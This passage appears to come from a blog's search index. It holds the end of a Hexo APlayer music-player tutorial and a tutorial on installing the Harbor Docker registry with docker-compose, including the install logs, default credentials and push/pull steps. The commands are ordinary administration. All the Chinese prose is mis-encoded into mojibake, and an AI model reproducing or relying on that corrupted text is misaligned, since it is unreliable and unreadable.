\'http://p2.music.126.net/W_5XiCv3rGS1-J7EXpHSCQ==/18885211718782327.jpg?param=300x300\', url: \'http://fs.open.kugou.com/cd5cbe8edb012e4f77b0857cefc0956e/5c66accf/G097/M08/0A/1F/AYcBAFkQGpOAMUpuAEm-3SlWMyk951.mp3\' }, { name: \'åä¼šæ— æœŸ\', artist: \'G.E.M.é‚“ç´«æ£‹\', lrc: \'/downloads/lrc/åä¼šæ— æœŸ-G.E.M.é‚“ç´«æ£‹.lrc\', cover: \'http://p1.music.126.net/vpvPajo3kn88nHc7jUjeWQ==/5974746185758035.jpg?param=300x300\', url: \'http://m10.music.126.net/20190215193113/e5afc8b5376136029366f2053cf30f85/ymusic/2c87/6ec3/582e/0d572dcc04f8de34133c0f364b74c30c.mp3\' } ] }); //å®ç°åˆ‡æ¢éŸ³é¢‘æ—¶ï¼Œæ ¹æ®éŸ³é¢‘çš„å°é¢å›¾ç‰‡è‡ªé€‚åº”ä¸»é¢˜è‰² const colorThief = new ColorThief(); const setTheme = (index) =&gt; { if (!ap.list.audios[index].theme) { colorThief.getColorAsync(ap.list.audios[index].cover, function(color) { ap.theme(`rgb(${color[0]}, ${color[1]}, ${color[2]})`, index); }); } }; setTheme(ap.list.index); ap.on(\'listswitch\', (data) =&gt; { setTheme(data.index); });&lt;/script&gt;&lt;% } %&gt; (adsbygoogle = window.adsbygoogle || []).push({}); é…ç½® Yilia ä¸»é¢˜ ç¼–è¾‘ Yilia ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ hexo-theme-yilia/_config.ymlï¼Œåœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ ä»¥ä¸‹å†…å®¹ã€‚ 12aplayer: enable: true é‡æ–°æ„å»ºåšå®¢ æç¤ºï¼Œè‹¥éŸ³é¢‘æ–‡ä»¶ä½¿ç”¨çš„æ˜¯æœ¬åœ°èµ„æºæ–‡ä»¶ï¼ŒåŒæ—¶é€šè¿‡ hexo server æä¾› Web æœåŠ¡ï¼Œé‚£ä¹ˆå°†æ— æ³•é€šè¿‡ APlayer çš„è¿›åº¦æ¡è°ƒèŠ‚æ’­æ”¾è¿›åº¦ï¼Œæ­¤æ—¶éœ€è¦ä½¿ç”¨ Nginxã€Apache ç­‰ Web æœåŠ¡å™¨ã€‚ 1234567891011# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd /blogroot# é€šè¿‡Hexoæ¸…ç†Publicç›®å½•$ hexo clean# é€šè¿‡Hexoæ„å»ºé™æ€æ–‡ä»¶$ hexo generate# é€šè¿‡Hexoå¯åŠ¨æœåŠ¡$ hexo server æ‰©å±•å»ºè®® è‹¥å¸Œæœ›æ—¥åæ–¹ä¾¿åœ°æ·»åŠ æˆ–åˆ é™¤æ­Œæ›²ï¼Œå»ºè®®å°†æ­Œæ›²ä¿¡æ¯å†™åœ¨å•ç‹¬çš„ Json æ–‡ä»¶ä¸­ï¼ŒJavaScript ä»£ç åˆå§‹åŒ– APlayer éŸ³ä¹æ’­æ”¾å™¨æ—¶åŠ¨æ€è¯»å– Json æ–‡ä»¶ï¼Œé‚£ä¹ˆæ—¥ååªéœ€è¦ç¼–è¾‘æ­Œæ›²çš„ Json æ–‡ä»¶å°±å¯ä»¥è¾¾åˆ°åŠ¨æ€æ›´æ–°æ­Œæ›²åˆ—è¡¨ç›®çš„ï¼Œæœ¬ç«™çš„éŸ³ä¹æ’­æ”¾å™¨ä½¿ç”¨äº†è¯¥æ–¹æ³•ã€‚ é¡µé¢åˆ‡æ¢åéŸ³é¢‘æ’­æ”¾ä¸­æ–­ å½“åšå®¢çš„ Web é¡µé¢åˆ‡æ¢åï¼ŒéŸ³é¢‘æ’­æ”¾ä¼šä¸­æ–­ï¼Œå»ºè®®ä½¿ç”¨ Pjax æ¥è§£å†³ï¼Œè¿™æ˜¯ä¸‹æ–¹è¯„è®ºåŒºç½‘å‹ç»™å‡ºçš„æ–¹æ¡ˆï¼Œæš‚æ—¶æœªäº²æµ‹ã€‚ æœ€ç»ˆæ•ˆæœå›¾ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢"},{title:"Docker ä¹‹åå…­æ­å»ºç§æœ‰ä»“åº“ç®¡ç†ç³»ç»Ÿ Harbor",url:"/posts/99d575a6.html",text:'ç›¸å…³ç«™ç‚¹ Harbor å®˜ç½‘ Harbor Docs Harbor Github Harbor Releases Harbor ä»‹ç» Harbor æ˜¯ VMware å…¬å¸å¼€æºçš„ä¸€ä¸ªç”¨äºå­˜å‚¨å’Œåˆ†å‘ Docker é•œåƒçš„ä¼ä¸šçº§ Registry æœåŠ¡å™¨ï¼Œä»¥ Docker å¼€æºçš„ Registry ä¸ºåŸºç¡€ï¼Œé€šè¿‡æ·»åŠ ä¸€äº›ä¼ä¸šå¿…éœ€çš„åŠŸèƒ½ç‰¹æ€§ï¼Œä¾‹å¦‚å®‰å…¨ã€æ ‡è¯†å’Œç®¡ç†ç­‰ï¼Œæ‰©å±•äº†å¼€æº Docker Distributionã€‚ä½œä¸ºä¸€ä¸ªä¼ä¸šçº§ç§æœ‰ Registry æœåŠ¡å™¨ï¼ŒHarbor æä¾›äº†æ›´å¥½çš„æ€§èƒ½å’Œå®‰å…¨ï¼Œæå‡ç”¨æˆ·ä½¿ç”¨ Registry æ„å»ºå’Œè¿è¡Œç¯å¢ƒä¼ è¾“é•œåƒçš„æ•ˆç‡ã€‚Harbor æ”¯æŒå®‰è£…åœ¨å¤šä¸ª Registry èŠ‚ç‚¹çš„é•œåƒèµ„æºå¤åˆ¶ï¼Œé•œåƒå…¨éƒ¨ä¿å­˜åœ¨ç§æœ‰ Registry ä¸­ï¼Œç¡®ä¿æ•°æ®å’ŒçŸ¥è¯†äº§æƒåœ¨å…¬å¸å†…éƒ¨ç½‘ç»œä¸­ç®¡æ§ã€‚å¦å¤–ï¼ŒHarbor ä¹Ÿæä¾›äº†é«˜çº§çš„å®‰å…¨ç‰¹æ€§ï¼Œè¯¸å¦‚ç”¨æˆ·ç®¡ç†ï¼Œè®¿é—®æ§åˆ¶å’Œæ´»åŠ¨å®¡è®¡ç­‰ã€‚ Harbor ç‰¹æ€§ åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼ˆRole Based Access Controlï¼‰ åŸºäºç­–ç•¥çš„é•œåƒå¤åˆ¶ï¼ˆPolicy based image replicationï¼‰ é•œåƒçš„æ¼æ´æ‰«æï¼ˆVulnerability Scanningï¼‰ AD/LDAP é›†æˆï¼ˆLDAP/AD supportï¼‰ é•œåƒçš„åˆ é™¤å’Œç©ºé—´æ¸…ç†ï¼ˆImage deletion &amp; garbage collectionï¼‰ å‹å¥½çš„ç®¡ç† UIï¼ˆGraphical user portalï¼‰ å®¡è®¡æ—¥å¿—ï¼ˆAudit loggingï¼‰ RESTful API éƒ¨ç½²ç®€å•ï¼ˆEasy deploymentï¼‰ Harbor ç»„ä»¶ ä¾èµ–çš„å¤–éƒ¨ç»„ä»¶: Nginxï¼ˆProxyï¼‰: Harbor çš„ Registryã€UIã€Token ç­‰æœåŠ¡ï¼Œé€šè¿‡ä¸€ä¸ªå‰ç½®çš„åå‘ä»£ç†ç»Ÿä¸€æ¥æ”¶æµè§ˆå™¨ã€Docker å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶å°†è¯·æ±‚è½¬å‘ç»™åç«¯ä¸åŒçš„æœåŠ¡ã€‚ Registry v2: Docker å®˜æ–¹é•œåƒä»“åº“ï¼Œè´Ÿè´£å‚¨å­˜ Docker é•œåƒï¼Œå¹¶å¤„ç† Docker Push/Pull å‘½ä»¤ã€‚ç”±äºæˆ‘ä»¬è¦å¯¹ç”¨æˆ·è¿›è¡Œè®¿é—®æ§åˆ¶ï¼Œå³ä¸åŒç”¨æˆ·å¯¹ Docker é•œåƒæœ‰ä¸åŒçš„è¯»å†™æƒé™ï¼ŒRegistry ä¼šæŒ‡å‘ä¸€ä¸ª Token æœåŠ¡ï¼Œå¼ºåˆ¶ç”¨æˆ·çš„æ¯æ¬¡ Docker Push/Pull è¯·æ±‚éƒ½è¦æºå¸¦ä¸€ä¸ªåˆæ³•çš„ Token, Registry ä¼šé€šè¿‡å…¬é’¥å¯¹ Token è¿›è¡Œè§£å¯†éªŒè¯ã€‚ Databaseï¼ˆMySQL/Postgresqlï¼‰ï¼šä¸º Core Services æä¾›æ•°æ®åº“æœåŠ¡ï¼Œè´Ÿè´£å‚¨å­˜ç”¨æˆ·æƒé™ã€å®¡è®¡æ—¥å¿—ã€Docker é•œåƒåˆ†ç»„ä¿¡æ¯ç­‰æ•°æ®ã€‚ Harbor è‡ªå·±çš„ç»„ä»¶: Core Servicesï¼ˆAdmin Serverï¼‰: è¿™æ˜¯ Harbor çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œä¸»è¦æä¾›ä»¥ä¸‹æœåŠ¡ï¼š APIï¼šæä¾› Harbor RESTful API UIï¼šæä¾›å›¾å½¢åŒ–ç•Œé¢ï¼Œå¸®åŠ©ç”¨æˆ·ç®¡ç† Registry ä¸Šçš„é•œåƒï¼Œå¹¶å¯¹ç”¨æˆ·è¿›è¡Œæˆæƒã€‚ Webhookï¼šä¸ºäº†åŠæ—¶è·å– Registry ä¸Šé•œåƒçŠ¶æ€å˜åŒ–çš„æƒ…å†µï¼Œåœ¨ Registry ä¸Šé…ç½® Webhookï¼ŒæŠŠçŠ¶æ€å˜åŒ–ä¼ é€’ç»™ UI æ¨¡å—ã€‚ Auth æœåŠ¡ï¼šè´Ÿè´£æ ¹æ®ç”¨æˆ·æƒé™ç»™æ¯ä¸ª Docker Push/Pull å‘½ä»¤ç­¾å‘ Tokenã€‚Docker å®¢æˆ·ç«¯å‘ Registry æœåŠ¡å‘èµ·çš„è¯·æ±‚ï¼Œå¦‚æœä¸åŒ…å« Tokenï¼Œä¼šè¢«é‡å®šå‘åˆ°è¿™é‡Œï¼Œè·å¾— Token åå†é‡æ–°å‘ Registry è¿›è¡Œè¯·æ±‚ã€‚ Replication Job Serviceï¼šæä¾›å¤šä¸ª Harbor å®ä¾‹ä¹‹é—´çš„é•œåƒåŒæ­¥åŠŸèƒ½ã€‚ Log Collectorï¼šä¸ºäº†å¸®åŠ©ç›‘æ§ Harbor è¿è¡Œï¼Œè´Ÿè´£æ”¶é›†å…¶ä»–ç»„ä»¶çš„æ—¥å¿—ï¼Œä¾›æ—¥åè¿›è¡Œåˆ†æã€‚ Harbor æ¶æ„å›¾ Harbor å®‰è£æ–¹å¼ ä¸å»ºè®®ä½¿ç”¨ Kubernetes æ¥å®‰è£ï¼ŒåŸå› æ˜¯é•œåƒä»“åº“éå¸¸é‡è¦ï¼Œå°½é‡ä¿è¯å®‰è£å’Œç»´æŠ¤çš„ç®€æ´æ€§ï¼Œå› æ­¤è¿™é‡Œç›´æ¥ä½¿ç”¨ Docker Compose çš„æ–¹å¼è¿›è¡Œå®‰è£ã€‚äº‹å®ä¸Š Harbor çš„æ¯ä¸ªç»„ä»¶éƒ½æ˜¯ä»¥ Docker å®¹å™¨çš„å½¢å¼æ„å»ºï¼Œå®˜æ–¹ä¹Ÿæ˜¯ä½¿ç”¨ Docker Compose æ¥å¯¹å®ƒè¿›è¡Œå®‰è£ã€‚Harbor å®˜æ–¹æä¾›ä»¥ä¸‹ä¸‰ç§å®‰è£æ–¹å¼: åœ¨çº¿å®‰è£…ï¼šä» Docker Hub ä¸‹è½½ Harbor çš„é•œåƒæ¥å®‰è£…ï¼Œç”±äº Docker Hub æ¯”è¾ƒæ…¢ï¼Œå»ºè®® Docker é…ç½®å¥½åŠ é€Ÿå™¨ã€‚ ç¦»çº¿å®‰è£…ï¼šè¿™ç§æ–¹å¼åº”å¯¹ä¸å®‰è£ä¸»æœºæ²¡è”ç½‘çš„æƒ…å†µä½¿ç”¨ï¼Œéœ€è¦æå‰ä¸‹è½½ç¦»çº¿å®‰è£…åŒ…åˆ°æœ¬åœ°ã€‚ OVA å®‰è£…ï¼šè¿™ä¸ªä¸»è¦ç”¨ vCentor ç¯å¢ƒæ—¶ä½¿ç”¨ã€‚ Harbor å®‰è£…ç¯å¢ƒè¯´æ˜ Harbor ä»¥å®¹å™¨çš„å½¢å¼è¿›è¡Œå®‰è£…ï¼Œå› æ­¤å¯ä»¥è¢«å®‰è£…åˆ°ä»»ä½•æ”¯æŒ Docker çš„ Linux å‘è¡Œç‰ˆï¼Œæœ¬æ•™ç¨‹çš„å®‰è£…ç¯å¢ƒå¦‚ä¸‹ï¼š ç¯å¢ƒåç§° ç‰ˆæœ¬ linux å‘è¡Œç‰ˆ CentOS Linux release 7.6.1810 (Core) docker-ce 18.09.0 docker-compose 1.24.0-rc1 harbor 1.7.1 harbor å®‰è£…æ–¹å¼ åœ¨çº¿å®‰è£… harbor å®‰è£…ä½ç½® /usr/local/harbor å®‰è£… Docker ç«™å†…æ•™ç¨‹ï¼šDocker ä¹‹ä¸€ Docker ä»‹ç»ä¸å®‰è£… å®‰è£… Docker-Compose ç«™å†…æ•™ç¨‹ï¼šDocker ä¹‹åä¸ƒ Docker-Compose å®‰è£…ä¸ä½¿ç”¨ å®‰è£… Harbor Harbor çš„åœ¨çº¿æˆ–è€…ç¦»çº¿å®‰è£…ç¨‹åºä¸‹è½½åœ°å€å¯ä»¥ä»è¿™é‡Œè·å–ï¼Œå¦‚æœä¸‹è½½å¤±è´¥ï¼Œè¯·è‡ªå¤‡æ¢¯å­ã€‚ 1234567891011121314151617181920212223242526272829303132333435# å®‰è£…æ–¹å¼åˆ†ä¸ºåœ¨çº¿å®‰è£…å’Œç¦»çº¿å®‰è£…ä¸¤ç§æ–¹å¼ï¼Œè¿™é‡Œé‡‡ç”¨åœ¨çº¿å®‰è£…æ–¹å¼# ä¸‹è½½åœ¨çº¿å®‰è£…ç¨‹åº# wget -P /usr/local https://storage.googleapis.com/harbor-releases/release-1.7.0/harbor-online-installer-v1.7.1.tgz# è§£å‹ä¸‹è½½æ–‡ä»¶# tar zxf /usr/local/harbor-online-installer-v1.7.1.tgz -C /usr/local/# ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæ ¹æ®è‡ªå·±çš„éœ€æ±‚è¿›è¡Œä¿®æ”¹# vim /usr/local/harbor/harbor.cfg# æœ¬æœºIPæˆ–è€…åŸŸåï¼Œä¸èƒ½æ˜¯127.0.0.1æˆ–è€…localhosthostname = 192.168.1.130# ç³»ç»ŸHarborç®¡ç†å‘˜çš„å¯†ç harbor_admin_password = Harbor12345# ç¦æ­¢ç”¨æˆ·æ³¨å†Œself_registration = off# è®¾ç½®åªæœ‰ç®¡ç†å‘˜å¯ä»¥åˆ›å»ºé¡¹ç›®project_creation_restriction = adminonly# ç”±äºHarborçš„Nginxç»„ä»¶é»˜è®¤ä¼šç›‘å¬å®¿ä¸»æœºçš„80ã€443ã€4443ç«¯å£ï¼Œå¦‚æœéœ€è¦æ›´æ”¹Nginxçš„ç«¯å£æ˜ å°„ï¼Œå¯ä»¥ä¿®æ”¹ä»¥ä¸‹é…ç½®æ–‡ä»¶# vim /usr/local/harbor/docker-compose.yml ports: - 8082:80 - 443:443 - 4443:4443# å¦‚æœä¸Šé¢æ›´æ”¹äº†Nginxçš„80ç«¯å£æ˜ å°„ï¼Œæ­¤æ—¶è¿˜éœ€è¦ç¼–è¾‘Harborçš„é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹hostnameåŠ ä¸ŠæŒ‡å®šçš„ç«¯å£å·# vim harbor.cfghostname = 192.168.1.130:8082# æ‰§è¡Œå®‰è£…è„šæœ¬# /usr/local/harbor/install.sh# Harbarçš„æ—¥å¿—ç›®å½•æ˜¯ï¼š/var/log/harbor# Harbarç›¸å…³æ•°æ®å·çš„æŒ‚è½½ç›®å½•é»˜è®¤æ˜¯å®¿ä¸»æœºçš„/dataç›®å½•ï¼Œå¦‚æœé‡æ–°å®‰è£…Harbarå¹¶åœ¨é…ç½®æ–‡ä»¶é‡Œæ›´æ”¹äº†æ•°æ®åº“å¯†ç ï¼Œåˆ™éœ€è¦åˆ é™¤/dataç›®å½•ï¼Œå¦åˆ™Harboréƒ¨åˆ†ç»„ä»¶ä¼šå¯åŠ¨å¤±è´¥ å®‰è£… Harbor çš„æ—¥å¿—ä¿¡æ¯ â˜…æŸ¥çœ‹è¯¦ç»†æ—¥å¿—ä¿¡æ¯â˜… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135[Step 0]: checking installation environment ...Note: docker version: 18.09.0Note: docker-compose version: 1.24.0[Step 1]: preparing environment ...Generated and saved secret to file: /data/secretkeyGenerated configuration file: ./common/config/nginx/nginx.confGenerated configuration file: ./common/config/adminserver/envGenerated configuration file: ./common/config/core/envGenerated configuration file: ./common/config/registry/config.ymlGenerated configuration file: ./common/config/db/envGenerated configuration file: ./common/config/jobservice/envGenerated configuration file: ./common/config/jobservice/config.ymlGenerated configuration file: ./common/config/log/logrotate.confGenerated configuration file: ./common/config/registryctl/envGenerated configuration file: ./common/config/core/app.confGenerated certificate, key file: ./common/config/core/private_key.pem, cert file: ./common/config/registry/root.crtThe configuration files are ready, please use docker-compose to start the service.[Step 2]: checking existing instance of Harbor ...[Step 3]: starting Harbor ...Creating network "harbor_harbor" with the default driverPulling log (goharbor/harbor-log:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-log321a8da5ee1f: Pull completee58cb02d4a79: Pull completeb1addcae27cf: Pull complete0add5fe71c61: Pull complete701d7cb4751e: Pull completeae052802ba8f: Pull complete474572a6c946: Pull completeDigest: sha256:1465ec82b77534eb4687093fff91c752ac655d4ed1fb7e7b23bb6e3905a1ef18Status: Downloaded newer image for goharbor/harbor-log:v1.7.1Pulling registry (goharbor/registry-photon:v2.6.2-v1.7.1)...v2.6.2-v1.7.1: Pulling from goharbor/registry-photon321a8da5ee1f: Already exists427e471dc5bb: Pull complete79d644c380a9: Pull completed1ee69ba441f: Pull complete13ee399ae5e6: Pull complete52da6cf3d71f: Pull completee6dfe8d3336d: Pull complete2261e5dd4591: Pull completeDigest: sha256:dccc66572458001ed3b8f8ead0f0a89f0455747992528bafb857ed031bae07dcStatus: Downloaded newer image for goharbor/registry-photon:v2.6.2-v1.7.1Pulling registryctl (goharbor/harbor-registryctl:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-registryctl321a8da5ee1f: Already exists60ab2a220157: Pull complete685cb36a4aa6: Pull complete6ab9cbb7c05b: Pull completed66f51b51c32: Pull complete152d893b8817: Pull completeDigest: sha256:de4b9c6684b7005379df6c48c05d2884c6b3cced0c98f8814c4506d71f781b9cStatus: Downloaded newer image for goharbor/harbor-registryctl:v1.7.1Pulling postgresql (goharbor/harbor-db:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-db321a8da5ee1f: Already exists3b62caa7690c: Pull complete0c0b8f8af809: Pull complete68db7c777555: Pull complete810390407c8c: Pull completed99f5e0b551e: Pull complete0dedd5da1f5d: Pull complete5e156cfb841f: Pull complete0433d5b9e1ad: Pull completeDigest: sha256:6031b1ed9337c3af78e627ecd45351e0e0d630b83cf45e1c924cb3e5b006cb44Status: Downloaded newer image for goharbor/harbor-db:v1.7.1Pulling adminserver (goharbor/harbor-adminserver:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-adminserver321a8da5ee1f: Already exists3235adc5dfba: Pull complete36df358268ae: Pull completef07cf44733c3: Pull complete153223fc88f2: Pull completeDigest: sha256:5a539a2c733ca9efcd62d4561b36ea93d55436c5a86825b8e43ce8303a7a0752Status: Downloaded newer image for goharbor/harbor-adminserver:v1.7.1Pulling core (goharbor/harbor-core:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-core321a8da5ee1f: Already exists95d433145bab: Pull complete49d3e2a9635a: Pull complete6a4cbc768efe: Pull complete7e7d30cebeb5: Pull completeDigest: sha256:2791572f21aeaa7e62d3ee90b5b7ced3903633d9809d19fa32d3a524d580fc12Status: Downloaded newer image for goharbor/harbor-core:v1.7.1Pulling portal (goharbor/harbor-portal:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-portal321a8da5ee1f: Already exists0c2edbea17ee: Pull complete35f0e6ee2803: Pull complete815b36cabaa4: Pull completeDigest: sha256:37a16e2ab4dc1499b25ce4a3f42c34a3c524fcfcd31f7433a459a738d4cec3b6Status: Downloaded newer image for goharbor/harbor-portal:v1.7.1Pulling redis (goharbor/redis-photon:v1.7.1)...v1.7.1: Pulling from goharbor/redis-photon321a8da5ee1f: Already existse37a237fdce1: Pull completea533db83c439: Pull complete60f1956f70fa: Pull completec7eecf8b746b: Pull completeDigest: sha256:9a10e8d0c3640c0207d94409fc61783643a2f5d866d4e1136c0718b3a5ac3015Status: Downloaded newer image for goharbor/redis-photon:v1.7.1Pulling jobservice (goharbor/harbor-jobservice:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-jobservice321a8da5ee1f: Already exists4809bd624b7e: Pull complete889c696c8f56: Pull complete72d181b0302b: Pull completeDigest: sha256:c6706d51a3476235d8e801806141aa8e7279608268fca8be8ccd2e74987db093Status: Downloaded newer image for goharbor/harbor-jobservice:v1.7.1Pulling proxy (goharbor/nginx-photon:v1.7.1)...v1.7.1: Pulling from goharbor/nginx-photon321a8da5ee1f: Already exists044755eb163c: Pull completeDigest: sha256:c941c386eb99613b4c7481b9e433372bfac07beddb52a4e73dd7356ac8373189Status: Downloaded newer image for goharbor/nginx-photon:v1.7.1Creating harbor-log ... doneCreating harbor-adminserver ... doneCreating registryctl ... doneCreating harbor-db ... doneCreating registry ... doneCreating redis ... doneCreating harbor-core ... doneCreating harbor-portal ... doneCreating harbor-jobservice ... doneCreating nginx ... doneâœ” ----Harbor has been installed and started successfully.----Now you should be able to visit the admin portal at http://192.168.1.130.For more details, please visit https://github.com/goharbor/harbor . Harborå¯åŠ¨/åœæ­¢/é‡å¯ 1234567891011121314151617181920212223242526272829303132333435363738# å¦‚æœæŸä¸ªHarborç»„ä»¶å¯åŠ¨å¤±è´¥ï¼Œå¯ä»¥åœ¨æ—¥å¿—ç›®å½•/var/log/harborä¸‹æŸ¥çœ‹å…·ä½“çš„æ—¥å¿—ä¿¡æ¯ï¼Œè¿›ä¸€æ­¥å®šä½å¯åŠ¨å¤±è´¥çš„åŸå› # å¯åŠ¨æ—¶Harboré»˜è®¤ä¼šç›‘å¬å®¿ä¸»æœºçš„80ã€443ã€4443ç«¯å£ï¼Œå¯åŠ¨Harborä¹‹å‰å¿…é¡»ç¡®ä¿å®¿ä¸»æœºçš„80ã€443ã€4443ç«¯å£ä¸è¢«å ç”¨ï¼Œå¦åˆ™Harborç›¸å…³ç»„ä»¶ä¼šå¯åŠ¨å¤±è´¥ã€‚# æŸ¥çœ‹Harborå®¹å™¨çš„è¿è¡ŒçŠ¶æ€# docker ps# æˆ–è€…é€šè¿‡docker-composeæŸ¥çœ‹ï¼Œæ­¤æ—¶éœ€è¦è¿›å…¥Harborå®‰è£…è„šæœ¬æ‰€åœ¨çš„ç›®å½•é‡Œæ‰§è¡Œç›¸å…³å‘½ä»¤# cd /usr/local/harbor# æŸ¥çœ‹Harborå®¹å™¨çš„è¿è¡ŒçŠ¶æ€# docker-compose ps Name Command State Ports-------------------------------------------------------------------------------------------------------------------------------------harbor-adminserver /harbor/start.sh Up (healthy)harbor-core /harbor/start.sh Up (healthy)harbor-db /entrypoint.sh postgres Up (healthy) 5432/tcpharbor-jobservice /harbor/start.sh Upharbor-log /bin/sh -c /usr/local/bin/ ... Up (healthy) 127.0.0.1:1514-&gt;10514/tcpharbor-portal nginx -g daemon off; Up (healthy) 80/tcpnginx nginx -g daemon off; Up (healthy) 0.0.0.0:443-&gt;443/tcp, 0.0.0.0:4443-&gt;4443/tcp, 0.0.0.0:80-&gt;80/tcpredis docker-entrypoint.sh redis ... Up 6379/tcpregistry /entrypoint.sh /etc/regist ... Up (healthy) 5000/tcpregistryctl /harbor/start.sh Up (healthy)# å¯åŠ¨Harborå®¹å™¨# docker-compose start# åœæ­¢Harborå®¹å™¨# docker-compose stop# é‡å¯Harborå®¹å™¨# docker-compose restart# åœæ­¢å¹¶åˆ é™¤Harborå®¹å™¨ï¼ŒåŠ ä¸Š-vå‚æ•°å¯ä»¥åŒæ—¶ç§»é™¤æŒ‚è½½åœ¨å®¹å™¨ä¸Šçš„ç›®å½•# docker-compose down# åˆ›å»ºå¹¶å¯åŠ¨Harboå®¹å™¨ï¼Œå‚æ•°â€œ-dâ€è¡¨ç¤ºåå°è¿è¡Œå‘½ä»¤# docker-compose up -d Harboræµ‹è¯•è®¿é—® æµè§ˆå™¨è¾“å…¥ä»¥ä¸‹åœ°å€æˆ–è€…åŸŸåè®¿é—®Harborçš„Webç•Œé¢ï¼Œé»˜è®¤è´¦å·å¯†ç ï¼šadmin/Harbor12345http://192.168.1.130 å°†æœ¬åœ°é•œåƒPushåˆ°Harbor 12345678910111213141516171819202122232425262728293031# é…ç½®Dockerå®¢æˆ·ç«¯å…è®¸ä½¿ç”¨Httpåè®®ï¼Œå¦‚æœNginxæ›´æ”¹äº†çš„ç«¯å£æ˜ å°„ï¼Œéœ€è¦åœ¨ä»¥ä¸‹IPåœ°å€åé¢æŒ‡å®šå…·ä½“çš„ç«¯å£å·# vim /etc/docker/daemon.json{ "insecure-registries":["192.168.1.130"]}# é‡æ–°åŠ è½½Dockerçš„é…ç½®æ–‡ä»¶# systemctl daemon-reload# é‡å¯Docker# systemctl restart docker# æ‹‰å–Dockerå®˜æ–¹çš„Centosé•œåƒ# docker pull centos:latest# æŸ¥çœ‹é•œåƒåˆ—è¡¨# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEcentos latest 1e1148e4cc2c 7 weeks ago 202MB....# ç™»å½•Harbor Registryï¼Œå›è½¦åè¾“å…¥adminç”¨æˆ·çš„å¸å·ä¿¡æ¯ï¼ˆadmin/Harbor12345ï¼‰# docker login 192.168.1.130# å¦‚æœä¸ä½¿ç”¨é»˜è®¤é¡¹ç›®ålibraryï¼Œåˆ™éœ€è¦ä½¿ç”¨adminç”¨æˆ·æå‰ç™»å½•Harborçš„Webç•Œé¢ï¼Œæ‰‹åŠ¨åˆ›å»ºæ–°é¡¹ç›®åå†è¿›è¡ŒPushæ“ä½œ# ç»™é•œåƒæ‰“ä¸Šç›¸åº”çš„æ ‡ç­¾, æ³¨æ„æ ‡ç­¾æ ¼å¼: ip/{project-name}/{image-name}[:tag]# é¡¹ç›®libraryåªæœ‰adminæœ‰å†™çš„æƒé™# docker tag centos:latest 192.168.1.130/library/centos:1.0# å°†æœ¬åœ°é•œåƒPushåˆ°Harbor# docker push 192.168.1.130/library/centos:1.0 å°†Harboré•œåƒPullåˆ°æœ¬åœ° 123456789# åˆ é™¤ä¸Šé¢åˆ›å»ºçš„é•œåƒ# docker rmi centos# docker rm 192.168.1.130/library/centos:1.0# å°†Harboré•œåƒPullåˆ°æœ¬åœ°# docker pull 192.168.1.130/library/centos:1.0# æŸ¥çœ‹é•œåƒåˆ—è¡¨# docker ps Harborå®‰è£…åæ›´æ”¹Nginxçš„ç«¯å£æ˜ å°„ 1234567891011121314151617181920212223242526272829303132333435# è¿›å…¥Harborçš„å®‰è£…ç›®å½•# cd /usr/local/harbor# åœæ­¢å¹¶åˆ é™¤Harborå®¹å™¨ï¼ŒåŠ ä¸Š-vå‚æ•°å¯ä»¥åŒæ—¶ç§»é™¤æŒ‚è½½åœ¨å®¹å™¨ä¸Šçš„ç›®å½•# docker-compose down# ç¼–è¾‘composeçš„é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹Nginxçš„80ç«¯å£æ˜ å°„# vim docker-compose.yml ports: - 8082:80 - 443:443 - 4443:4443# ç¼–è¾‘Harborçš„é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹hostnameåŠ ä¸ŠæŒ‡å®šçš„ç«¯å£å·# vim harbor.cfghostname = 192.168.1.130:8082# é‡æ–°ç”Ÿæˆé…ç½®æ–‡ä»¶# prepare# åˆ›å»ºå¹¶å¯åŠ¨Harborå®¹å™¨# docker-compose up -d# æŸ¥çœ‹Harborçš„å®¹å™¨åˆ—è¡¨ï¼Œå‘ç°Nginxçš„ç«¯å£æ˜ å°„å·²ç»æ›´æ”¹æˆåŠŸ# docker-compose psharbor-adminserver /harbor/start.sh Up (health: starting)harbor-core /harbor/start.sh Up (health: starting)harbor-db /entrypoint.sh postgres Up (health: starting) 5432/tcpharbor-jobservice /harbor/start.sh Upharbor-log /bin/sh -c /usr/local/bin/ ... Up (healthy) 127.0.0.1:1514-&gt;10514/tcpharbor-portal nginx -g daemon off; Up (health: starting) 80/tcpnginx nginx -g daemon off; Up (health: starting) 0.0.0.0:443-&gt;443/tcp, 0.0.0.0:4443-&gt;4443/tcp, 0.0.0.0:8082-&gt;80/tcpredis docker-entrypoint.sh redis ... Up 6379/tcpregistry /entrypoint.sh /etc/regist ... Up (health: starting) 5000/tcpregistryctl /harbor/start.sh Up (health: starting) 